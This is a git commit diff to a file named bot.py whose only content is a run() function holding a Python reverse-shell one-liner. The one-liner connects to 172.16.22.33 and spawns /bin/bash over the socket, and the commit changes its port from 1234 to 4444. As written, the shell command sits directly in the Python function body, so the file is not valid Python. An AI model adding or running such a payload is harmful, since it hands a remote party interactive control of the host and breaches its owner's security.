f7215af3b31a53cfca2cb015711ec9dfdf80cd9d
daniyc4 <125304200+daniyc4@users.noreply.github.com>
2023-02-13 20:10:01 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,2 +1,2 @@
 def run():
-    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.22.33",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.22.33",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
